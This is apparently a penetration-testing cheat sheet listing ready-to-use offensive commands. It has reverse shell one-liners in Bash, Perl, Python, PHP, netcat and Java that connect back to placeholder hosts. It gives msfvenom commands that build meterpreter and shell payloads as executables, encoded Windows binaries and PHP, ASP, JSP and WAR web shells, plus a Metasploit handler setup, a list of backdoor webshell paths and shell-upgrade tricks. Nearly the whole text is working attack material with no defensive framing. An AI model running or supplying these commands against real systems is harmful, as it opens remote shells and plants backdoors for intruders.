## Reverse Shell

- Bash
  - `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
  - `bash -c '/bin/bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'`

- Perl
  - `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

- Python
  - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

- PHP
  - `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

- Netcat
  - `nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
  - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

- Java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

- Msfvenom

	- Binaries

		- Linux
			- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f elf > shell.elf`

		- Windows
			- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f exe > reverse.exe`
			- `msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT –f exe > /root/Desktop/reverse.exe`
			- `msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -e x86/shikata_ga_nai -f vba-exe`
			- `msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -e x86/shikata_ga_nai -f exe -o reverse.exe`
			- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f exe -o reverse.exe`

	- Web Payloads

		- PHP
			- `msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT -f raw > shell.php`
			- `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`

		- ASP
			- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f asp > shell.asp`

		- JSP
			- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f raw > shell.jsp`

		- WAR
			- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f war > shell.war`

	- Scripting Payloads

		- Python
			- `msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=$PORT -f raw > shell.py`

		- Bash
			- `msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=$PORT -f raw > shell.sh`

		- Perl
			- `msfvenom -p cmd/unix/reverse_perl LHOST=$IP LPORT=$PORT -f raw > shell.pl`

	- Shellcode

		-  Linux Based Shellcode 
			- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f $LANGUAGE`

		-  Windows Based Shellcode 
			- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f $LANGUAGE`

- Handlers
```
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```
	- `msfconsole -L -r`

- [URL](https://www.hackingarticles.in/2-ways-use-msfvenom-payload-netcat/)
- [URL](https://netsec.ws/?p=331)
- [URL](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)

### Webshells

- Asp
	- `/usr/share/webshells/asp/cmd-asp-5.1.asp`
	- `/usr/share/webshells/asp/cmdasp.asp`

- Aspx
	- `/usr/share/webshells/aspx/cmdasp.aspx`

- Cfm
	- `/usr/share/webshells/cmf/cfexec.cfm`

- Jsp
	- `/usr/share/webshells/jsp/cmfjsp.jsp`
	- `/usr/share/webshells/jsp/jsp-reverse.jsp`

- Perl
	- `/usr/share/webshells/perl/perlcmd.cgi`
	- `/usr/share/webshells/perl/perl-reverse-shell.pl`

- Php
	- `/usr/share/webshells/php/findsocket/*`
	- `/usr/share/webshells/php/php-backdoor.php`
	- `/usr/share/webshells/php/php-reverse-shell.php`
	- `/usr/share/webshells/php/qsd-php-backdoor.php`
	- `/usr/share/webshells/php/simple-backdoor.php`

- Useful
  - `rlwrap nc localhost 80`
  - [rlwrap](https://github.com/hanslub42/rlwrap)

## Spawing Shell

- Python
  - `python -c "import pty;pty.spawn('/bin/bash')"`

- Echo
  - `echo 'os.system('/bin/bash')'`

- Sh
  - `/bin/sh -i`

- Bash
  - `/bin/bash -i`

- Perl
  - `perl -e 'exec "/bin/sh";'`

- Ruby
  - `ruby: exec "/bin/sh"`

- Lua
  - `lua: os.execute('/bin/sh')`

- Vi
  - `!bash`
  - `set shell=/bin/bash:shell`

- Nmap
  - `!sh`

- Extras:
  - `stty raw -echo`
  - `export TERM=xterm`

